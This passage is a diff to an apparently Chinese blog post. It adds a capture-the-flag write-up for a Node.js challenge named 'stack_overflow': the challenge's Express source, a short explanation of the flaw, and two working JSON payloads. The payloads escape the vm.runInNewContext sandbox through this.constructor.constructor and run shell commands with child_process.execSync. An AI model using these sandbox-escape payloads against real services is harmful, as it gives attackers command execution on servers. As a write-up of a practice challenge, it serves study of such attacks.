@@ -104,11 +104,263 @@
         <p>vm.runInNewContext沙箱逃逸</p>
 <span id="more"></span>
 
-<h1 id="stack-overflow"><a href="#stack-overflow" class="headerlink" title="stack_overflow"></a>stack_overflow</h1>
+<h1 id="stack-overflow"><a href="#stack-overflow" class="headerlink" title="stack_overflow"></a>stack_overflow</h1><p>源码：</p>
+<pre><code class="js">const express = require(&#39;express&#39;)
+const vm = require(&quot;vm&quot;);
+
+let app = express();
+app.use(express.json());
+app.use(&#39;/static&#39;, express.static(&#39;static&#39;))
+
+const pie = parseInt(Math.random() * 0xffffffff)
+
+function waf(str) &#123;
+    let pattern = /(call_interface)|\&#123;\&#123;.*?\&#125;\&#125;/g;
+    return str.match(pattern)
+&#125;
+
+app.get(&#39;/&#39;, (req, res) =&gt; &#123;
+    res.sendFile(__dirname + &quot;/index.html&quot;)
+&#125;)
+
+app.post(&#39;/&#39;, (req, res) =&gt; &#123;
+    let respond = &#123;&#125;
+
+    let stack = []
+    
+    let getStack = function (address) &#123;
+        if (address - pie &gt;= 0 &amp;&amp; address - pie &lt; 0x10000) return stack[address - pie]
+        return 0
+    &#125;
+
+    let getIndex = function (address) &#123;
+        return address - pie
+    &#125;
+
+    let read = function (fd, buf, count) &#123;
+        let ori = req.body[fd]
+        if (ori.length &lt; count) &#123;
+            count = ori.length
+        &#125;
+
+        if (typeof ori !== &quot;string&quot; &amp;&amp; !Array.isArray(ori)) return res.json(&#123;&quot;err&quot;: &quot;hack!&quot;&#125;)
+
+        for (let i = 0; i &lt; count; i++)&#123;
+            if (waf(ori[i])) return res.json(&#123;&quot;err&quot;: &quot;hack!&quot;&#125;)
+            stack[getIndex(buf) + i] = ori[i]
+        &#125;
+    &#125;
+
+    let write = function (fd, buf, count) &#123;
+        if (!respond.hasOwnProperty(fd)) &#123;
+            respond[fd] = []
+        &#125;
+        for (let i = 0; i &lt; count; i++)&#123;
+            respond[fd].push(getStack(buf + i))   
+        &#125;
+    &#125;
+
+    let run = function (address) &#123;
+        let continuing = 1;
+        while (continuing) &#123;
+            switch (getStack(address)) &#123;
+                case &quot;read&quot;:
+                    let r_fd = stack.pop()
+                    let read_addr = stack.pop()
+                    if (read_addr.startsWith(&quot;&#123;&#123;") && read_addr.endsWith("&#125;&#125;&quot;)) &#123;
+                        read_addr = pie + eval(read_addr.slice(2,-2).replace(&quot;stack&quot;, (stack.length - 1).toString()))
+                    &#125;
+                    read(r_fd, parseInt(read_addr), parseInt(stack.pop()))
+                    break;
+                case &quot;write&quot;:
+                    let w_fd = stack.pop()
+                    let write_addr = stack.pop()
+                    if (write_addr.startsWith(&quot;&#123;&#123;") && write_addr.endsWith("&#125;&#125;&quot;)) &#123;
+                        write_addr = pie + eval(write_addr.slice(2,-2).replace(&quot;stack&quot;, (stack.length - 1).toString()))
+                    &#125;
+                    write(w_fd, parseInt(write_addr), parseInt(stack.pop()))
+                    break;
+                case &quot;exit&quot;:
+                    continuing = 0;
+                    break;
+                case &quot;call_interface&quot;:
+                    let numOfArgs = stack.pop()
+                    let cmd = stack.pop()
+                    let args = []
+                    for (let i = 0; i &lt; numOfArgs; i++) &#123;
+                        args.push(stack.pop())
+                    &#125;
+                    cmd += &quot;(&#39;&quot;  + args.join(&quot;&#39;,&#39;&quot;) + &quot;&#39;)&quot;
+                    let result = vm.runInNewContext(cmd)
+                    stack.push(result.toString())
+                    break;
+                case &quot;push&quot;:
+                    let numOfElem = stack.pop()
+                    let elemAddr = parseInt(stack.pop())
+                    for (let i = 0; i &lt; numOfElem; i++) &#123;
+                        stack.push(getStack(elemAddr + i))
+                    &#125;
+                    break;
+                default:
+                    stack.push(getStack(address))
+                    break;
+            &#125;
+            address += 1
+        &#125;
+    &#125;
+
+    let code = `0
+0
+0
+0
+0
+0
+0
+0
+0
+0
+0
+0
+0
+0
+0
+0
+0
+0
+0
+0
+28
+[[ 0 ]]
+stdin
+read
+Started Convertion...
+Your input is:
+2
+[[short - 3]]
+stdout
+write
+5
+[[ 0 ]]
+stdout
+write
+...
+1
+[[short - 2]]
+stdout
+write
+[[ 0 ]]
+5
+push
+(function (...a)&#123;  return a.map(char=&gt;char.charCodeAt(0)).join(&#39; &#39;);&#125;)
+5
+call_interface
+Ascii is:
+1
+[[short - 2]]
+result
+write
+1
+&#123;&#123; stack - 2 &#125;&#125;
+result
+write
+Ascii is:
+1
+[[short - 2]]
+stdout
+write
+1
+&#123;&#123; stack - 3 &#125;&#125;
+stdout
+write
+ok
+1
+[[short - 2]]
+status
+write
+exit`
+    
+    code = code.split(&#39;\n&#39;);
+    for (let i = 0; i &lt; code.length; i++)&#123;
+        stack.push(code[i])
+        if (stack[i].startsWith(&quot;[[&quot;) &amp;&amp; stack[i].endsWith(&quot;]]&quot;)) &#123;
+            stack[i] = (pie + eval(stack[i].slice(2,-2).replace(&quot;short&quot;, i.toString()))).toString()
+        &#125;
+    &#125;
+    run(pie + 0)
+    return res.json(respond)
+&#125;)
+
+app.listen(3090, () =&gt; &#123;
+    console.log(&quot;listen on 3090&quot;);
+&#125;)
+</code></pre>
+<h2 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h2><p>模拟一个栈的操作，read的时候从stdin中取得28个值，也就是到code中的[[short - 3]]这个值，可以覆盖后四个值，用来执行东西</p>
+<p>读到call_interface的时候会去vm里面执行代码，存在沙箱逃逸漏洞</p>
+<p>由于存在waf，我们无法直接去call_interface</p>
+<h2 id="方法一-非预期"><a href="#方法一-非预期" class="headerlink" title="方法一(非预期)"></a>方法一(非预期)</h2><p>在cmd +&#x3D; “(‘“  + args.join(“‘,’”) + “‘)”处，直接闭合代码传入payload</p>
+<pre><code class="js">&#123;&quot;stdin&quot;:[&quot;&#39;);var exec = this.constructor.constructor;var require = exec(&#39;return process.mainModule.constructor._load&#39;)();require(&#39;child_process&#39;).execSync(\&quot;dir\&quot;).toString(); //&quot;]&#125;
+</code></pre>
+<h2 id="方法二"><a href="#方法二" class="headerlink" title="方法二"></a>方法二</h2><p>泄露pie找到匿名函数地址，然后覆盖为逃逸代码即可</p>
+<ol>
+<li><p>输入27个数字，输出的即为pie，调试之后得到匿名函数地址</p>
+<pre><code class="json">req:
+&#123;
+  &quot;stdin&quot;: [
+    &quot;1&quot;,
+    &quot;2&quot;,
+    ....
+    &quot;24&quot;,
+    &quot;25&quot;,
+    &quot;3421001076&quot;, //不同系统可能值不同
+    &quot;func&quot;,
+    &quot;write&quot;
+  ]
+&#125;
+res:
+&#123;&quot;func&quot;:[&quot;(function (...a)&#123;  return a.map(char=&gt;char.charCodeAt(0)).join(&#39; &#39;);&#125;)&quot;,&quot;5&quot;,&quot;call_interface&quot;,&quot;Ascii is:&quot;,&quot;1&quot;,&quot;3421001079&quot;,&quot;result&quot;,&quot;write&quot;,&quot;1&quot;,&quot;&#123;&#123; stack - 2 &#125;&#125;&quot;,&quot;result&quot;,&quot;write&quot;,&quot;Ascii is:&quot;,&quot;1&quot;,&quot;3421001088&quot;,&quot;stdout&quot;,&quot;write&quot;,&quot;1&quot;,&quot;&#123;&#123; stack - 3 &#125;&#125;&quot;,&quot;stdout&quot;,&quot;write&quot;,&quot;ok&quot;,&quot;1&quot;,&quot;3421001097&quot;,&quot;status&quot;],&quot;stdout&quot;:[&quot;1&quot;,&quot;2&quot;,&quot;3&quot;,&quot;4&quot;,&quot;5&quot;,&quot;...&quot;,&quot;Ascii is:&quot;,&quot;53 52 51 50 49&quot;],&quot;result&quot;:[&quot;Ascii is:&quot;,&quot;53 52 51 50 49&quot;],&quot;status&quot;:[&quot;ok&quot;]&#125;
+</code></pre>
+</li>
+<li><p>由此可知地址为3421001076，然后我们read一下，把这个地址上的函数替换为我们传入的函数，即可：</p>
+<pre><code class="json">&#123;
+  &quot;stdin&quot;: [
+    &quot;(function (...a)&#123; return this.constructor.constructor(\&quot;return process\&quot;)().mainModule.require(\&quot;child_process\&quot;).execSync(\&quot;dir\&quot;).toString();&#125;)&quot;,
+    &quot;2&quot;,
+    &quot;3&quot;,
+    &quot;4&quot;,
+    &quot;5&quot;,
+    &quot;6&quot;,
+    &quot;7&quot;,
+    &quot;8&quot;,
+    &quot;9&quot;,
+    &quot;10&quot;,
+    &quot;11&quot;,
+    &quot;12&quot;,
+    &quot;13&quot;,
+    &quot;14&quot;,
+    &quot;15&quot;,
+    &quot;16&quot;,
+    &quot;17&quot;,
+    &quot;18&quot;,
+    &quot;19&quot;,
+    &quot;20&quot;,
+    &quot;21&quot;,
+    &quot;22&quot;,
+    &quot;23&quot;,
+    &quot;24&quot;,
+    &quot;1&quot;,
+    &quot;3421001076&quot;,
+    &quot;stdin&quot;,
+    &quot;read&quot;
+  ]
+&#125;
+</code></pre>
+</li>
+</ol>
+<h1 id="d3pythonhttp"><a href="#d3pythonhttp" class="headerlink" title="d3pythonhttp"></a>d3pythonhttp</h1>
         <div class="content" v-pre>
             <!-- 
     <div id="toc">
-        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#stack-overflow"><span class="toc-text">stack_overflow</span></a></li></ol>
+        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#stack-overflow"><span class="toc-text">stack_overflow</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%8E%9F%E7%90%86"><span class="toc-text">原理</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%96%B9%E6%B3%95%E4%B8%80-%E9%9D%9E%E9%A2%84%E6%9C%9F"><span class="toc-text">方法一(非预期)</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%96%B9%E6%B3%95%E4%BA%8C"><span class="toc-text">方法二</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#d3pythonhttp"><span class="toc-text">d3pythonhttp</span></a></li></ol>
     </div>
  -->
         </div>
